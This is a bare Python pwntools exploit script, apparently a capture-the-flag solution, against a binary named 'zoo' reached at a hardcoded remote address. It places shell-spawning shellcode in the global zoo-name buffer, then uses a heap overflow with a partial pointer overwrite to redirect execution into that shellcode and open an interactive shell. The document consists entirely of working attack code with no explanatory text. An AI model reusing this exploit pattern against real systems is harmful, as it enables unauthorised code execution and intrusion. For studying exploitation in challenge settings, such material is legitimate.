#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib
import time

c = 0
pwn_file = "./zoo"

elf = ELF(pwn_file)
lib = ELF('./libc-2.23.so')
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
context.log_level = 'debug'

debug = 0
if debug == 1:
    ld_str = "./ld-2.23.so.64 --library-path ./ {}".format(pwn_file)
    print(ld_str.split())
    c = process(ld_str.split(), env={'LD_PRELOAD': './libc-2.23.so'})

    elf_path = c.cwd + c.argv[3].decode().strip('.')
    lib_path = c.cwd + '/libc-2.23.so'

    sleep(0.1)
    print(c.libs())
    gdbcmd = '''
    file {} 
    info proc mappings
    set $elf={}
    set $lib={}
    '''.format(pwn_file, hex(c.libs()[elf_path]), hex(c.libs()[lib_path]))

    gdb.attach(c, gdbcmd)
else:
    c = remote('140.110.112.77', '2128')

zooname_addr = elf.symbols['nameofzoo'] + 1

c.sendafter('Name of Your zoo :', b'a' + p64(zooname_addr + 0x8) + asm(shellcraft.sh()))

def add_dog(name):
    c.sendlineafter('Your choice :', '1')
    c.sendlineafter('Name :', name)
    c.sendlineafter('Weight : ', '1')

def listen(index):
    c.sendlineafter('Your choice :', '3')
    c.sendlineafter('index of animal :', str(index))

def del_animal(index):
    c.sendlineafter('Your choice :', '5')
    c.sendlineafter('index of animal :', str(index))


add_dog('123')
add_dog('321')
add_dog('AAA')
del_animal(0)
#input()

add_dog(b'c' * (0x48) + p64(zooname_addr)[0:3])
listen(0)



c.interactive()
c.close()
